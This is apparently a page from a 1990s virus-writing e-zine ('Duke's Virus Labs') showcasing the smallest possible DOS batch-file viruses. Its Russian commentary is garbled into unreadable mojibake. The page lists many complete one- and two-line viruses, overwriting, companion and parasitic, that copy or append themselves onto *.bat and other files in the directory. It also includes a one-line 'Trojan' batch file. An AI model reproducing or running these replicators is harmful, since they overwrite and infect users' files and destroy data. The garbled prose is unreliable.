- [Duke's Virus Labs #8] - [Page 18] -

Smallest BAT-virii in the world !
(c) by Duke/SMF

   �ࠧ� ������, �� � 楫�� ᮪�饭�� ࠧ��� ����� �� ��᪨஢��
("@", "echo off", "ctty nul", ">nul" � ��祥) ���饭�. ���⮬� ������
�뤠�� �� ��࠭ ���� ᮮ�饭�� � �த������� ࠡ�� � �訡���...
�� �������� !

   � ��᫥���� ����� ��ୠ�� Moon Bug (#10) � ��᪠�뢠� � ⮭������
����ᠭ�� ᠬ�� ���⪨� BAT.Trivial ����ᮢ. �� �।������� � ⮩ ����
������ �४�᭮ ��᪨஢�����, � ᠬ� ���⪨� ����祭�� ����� ���� ࠧ���
44 ���� :

===== begin t44.bat =====
@ctty nul
for %%b in (*.bat) do copy %0 %%b
===== end   t44.bat =====

   ��� � � ����ਫ, ��� ������ ��᪨஢�� :

===== begin t33.bat =====
for %%b in (*.bat) do copy %0 %%b
===== end   t33.bat =====

   �� � ��� � ��� ���� ���������⥫쭠� �᪮�� - ��᪠ �� ���ன �� �饬
䠩��. ��� ���᪠ ��⭨��� ������ �������� *.b*, � ����� 㭨�⮦��� � ��
䠩��.

===== begin t32.bat =====
for %%b in (*.b*) do copy %0 %%b
===== end   t32.bat =====

===== begin t31.bat =====
for %%b in (*.*) do copy %0 %%b
===== end   t31.bat =====

   � ⥯��� ������ ������ਬ � ᠬ�� �����쪨� ��⭨���, �� ������� ���
�����, �.�. � Parasitic � Companion ������. � ��� ��᪠�뢠�� ⮫쪮 �
᢮�� ������, ��᪮��� �� ����� �㦮� ࠧࠡ�⪨ � �� �� ����� ;-))

   � ��ୠ�� DVL #7 ���� �� �।����� ������쮭 ����� ࠧ��஬ � 54 ����
(BAT.Silly.54 �� AVP) � � �।����� ��� ᮯ⨬���஢���. ����� �� �����頥�
�ࠢ����� ���⢥ � ��ࠦ��� ⮫쪮 ���� (��᫥����) 䠩� ��⠫���.

===== begin c54.bat =====
for %%a in (*.b*) do set a=%%a
ren %a% *.|copy %0 %a%
===== end   c54.bat =====

   ������, ��᫥ �������� ࠧ��諥��� � ���஢���� ���� �� �ࠪ⨪�,
� 㡥�����, �� ��� ����뢠��� ���७�� �����筮 �ᯮ�짮���� �������
"ren %a% *", �� �� 1 ���� �����. ����� ��ࠧ�� � ᠬ ��⨬���஢�� ���
����� :) ��⠫��, ������, ᫠��....

===== begin c53.bat =====
for %%a in (*.b*) do set a=%%a
ren %a% *|copy %0 %a%
===== end   c53.bat =====

   �����, ����� �㤥� ��ࠦ��� ��� 䠩�� ��⠫���, 㬥�⨫�� � 63 ���� :

===== begin c63.bat =====
if "%1==" for %%i in (*.b*) do call %0 %%i
ren %1 *|copy %0 %1
===== end   c63.bat =====

   ��������� 'if "%1==" ' �㦭� ��� ⮣�, �⮡� ��� ��⭨� �� �� ������ �
��᪮����� ४����� (���� �� �������⭮ ��뢠�� ᠬ ᥡ�!). �� ��
�⮩ �������樨 ����� �⬠������. ��� �㦭�, �⮡� ���� 䠩��� ࠡ�⠫
⮫쪮 ���� ࠧ - ����� ���� ��ࠬ��� ��������� ��ப� ���� !
���� �� ��蠥� ��� �᪠�� 䠩�� �� ��᪥ '*.%1b*', �� ���� �������
�㤥� ������� '*.b*' :

===== begin c55.bat =====
for %%i in (*.%1b*) do call %0 %%i
ren %1 *|copy %0 %1
===== end   c55.bat =====

   � ��� �� ��᪮�쪮 ��ਠ権 �� ⥬� ������쮭�� (�ࠢ��, �� ����襣�
ࠧ���). ���� �� ��� ��२�����뢠�� �� *.b* � 䠩�� ��� ���७��,
� ����� ��� �����뢠���� ᠬ, ��祬 � ᠬ�� ᮡ�� �� ���४⭮ ;-)))
� ᮦ������, �� ����୮� ��ࠦ���� ��ࢮ��砫쭮 ��ࠦ���� 䠩� ������ :((

===== begin c69.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*.) do copy %0 %%i.bat
===== end   c69.bat =====

   �� �⮬ ����� ����� �����쪮 ����⨬���஢��� ! �᫨ �� ����஢����
�ᯮ�짮���� ���ਪ� "*", � �� ���� ����� ��⠭���� ��� ���������.
�ਬ���� ��� ��� ��� ���७�� (���� ����� ����� ���⮢��� ⮫쪮 ��
BAT-䠩�� !) � 㬥��訬 ࠧ��� �� 2 ���� :

===== begin c67.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*.) do copy %0 %%i.*
===== end   c67.bat =====

   �� ���� 䠩��� ��� ���७�� ����� �஢����� �� �� ����� ���⮩ ��᪥
('*.' ���������⭮ '*') :

===== begin c66.bat =====
for %%i in (*.b*) do copy %%i *
for %%i in (*) do copy %0 %%i.*
===== end   c66.bat =====

   ������騩 ����� ������� �� 䠩�� � 䠩� ��� ���७��, ���⮬� �᫨ �
��� ���� ��᪮�쪮 ����������� 䠩��� � ��������� ���७���, � �릨���
���� ���� :((

===== begin c65.bat =====
for %%i in (*.*) do copy %%i *
for %%i in (*.*) do copy %0 %%i
===== end   c65.bat =====

   ������ � ��ࠧ���᪨� ������. ���� �������� ���� �㤥� �����
��ࠧ���᪨� BAT-������, ����� �᪠�� � ᮡ�� �� ࠭�� ��ࠦ����
䠩�� :((
   ��� �������� - ��ࠧ���᪨� �����, ����� �� �஢���� 䠩�� ��
����୮� ��ࠦ����, �� �� ��ࠦ��� ����� �� 䠩��� � ��⠫��� �⮫쪮 ࠧ,
᪮�쪮 ᢥ�� ��⭨��� � ��⠫��� :)) �� ࠡ�⠥�, � ࠧ��� ������.

===== begin p69.bat =====
if "%1==" for %%m in (*.b*) do call %0 %%m
copy /b %0+%1 #
copy # %1
===== end   p69.bat =====

   �ਬ���� ���, ���ᠭ� ���� � ࠧ���� ������쮭��, ����稬 :

===== begin p61.bat =====
for %%m in (*.%1b*) do call %0 %%m
copy/b %0+%1 #
copy # %1
===== end   p61.bat =====

   � ��������� �訡���... ������� "for %%i in (*.bat) do type %0>>%%i"
ࠡ���� �� �㤥� ! �� �易�� � �������������� ��७��ࠢ����� � �������
FOR... :(((
   �� ���� �� ��㬪� ��� ! ���⮬� � ����ᠫ ����� BAT.Silly.32, �
�२����⢠� ���ண� ����� �⭥�� :
+ ��ࠧ���᪨� (!!!), �.� �㤥᭮ ������;
+ ��ࠦ��� �� 䠩�� *.b* � ⥪�饩 ��४�ਨ;
+ �� ��ࠦ��� ᠬ ᥡ� !
����� �ᯮ������ �� 䠪�, �� �᫨ �� ������ ��� "�㤠_����஢���",
� �� 㬮�砭�� 䠩���-����⮬ �⠭������ ���� 㪠����� 䠩�.
�� � ᨬ��� "+" ����砥� ᪫���� 䠩���...

===== begin p32.bat =====
for %%b in (*.b*) do copy %%b+%0
===== end   p32.bat =====

����� �� ������� ������⪮� ���� �, �� ��� ���४⭮� ࠡ���
��ࠦ������ 䠩�� � ����� � ���, ����室��� ����稥 � �⮬ 䠩�� ��ॢ���
��ப� ��᫥ ��᫥���� ��ப�. �� ���� 䠩� ������ �����稢����� ᨬ������
0Dh, 0Ah. � ⠪�� ����砥��� ������ �� �ᥣ��. ���⮬� ����� �����ᯮᮡ��
�㤥� ��㣮� ����� - BAT.Silly.34 (� ��ࠦ����� 䠩��� �� �⫨��� ����������,
���⮬� �ࠢ��쭥� ������� �� BAT.Silly.32/34) :

===== begin p34.bat =====

for %%b in (*.b*) do copy %%b+%0
===== end   p34.bat =====

   � �⮡� ��� ����� �� ��᮫��� ������⥫�� �।� ��ࠧ���᪨� ��⭨���,
� �� ����� ᮪�⨫ ���� ���᪠ � ����稫 31 ���� :

===== begin p31.bat =====
for %%b in (*.*) do copy %%b+%0
===== end   p31.bat =====

   �� ���� ����� ����ᮢ, ����� ����뢠�� ᮡ�⢥��� ��� �� STDOUT
� ������� �� �, �� � ��������� ��ப� 㪠���� ��७��ࠢ����� �뢮�� �
��㣮� 䠩� ;) ��ᯥ�᪨� ���뢠�� ⠪�� ������, ����ᠭ�� �� ��ᥬ����,
��� Trojan.STDOUT.* . ��� ����� ࠧ��� 5-7 ����. �� � ��� ��� �� ��ᥬ����,
���⮬� � �।����� Trojan.STDOUT.10 �� BAT-�몥 (��࠭��, �� ��ᯥ�᪨�
ᠬ �� ���㬠��� �� �⮣� ;-) :

===== begin t10.bat =====
type %0>%1
===== end   t10.bat =====

������ த� ��த�� �� �����⭥�訩 ����� "copy %0 %1", ����� �� �� ���
�� ��⥪������ ;-))))

   �᫨ ��襯ਢ������ ��� ᮢᥬ ����-���� ����୨��஢���, �� ����稬
ᠬ� ���⪨� � ��� ��ࠧ���᪨� BAT-�����, ����� ࠡ�⠥� �� ��,
祬 �뢠�� 29 䥢ࠫ� :

===== begin p11.bat =====
type %0>>%1
===== end   p11.bat =====

   �� ��� ���� � ��... ������� ��� �뫮 ����᭮ � �� ��� ������� �뫨
��ࠦ��� ����������ﬨ �몠 Batch. ��������, � ������襬 ���饬 ��᫥���
�த������� �⮩ ����...

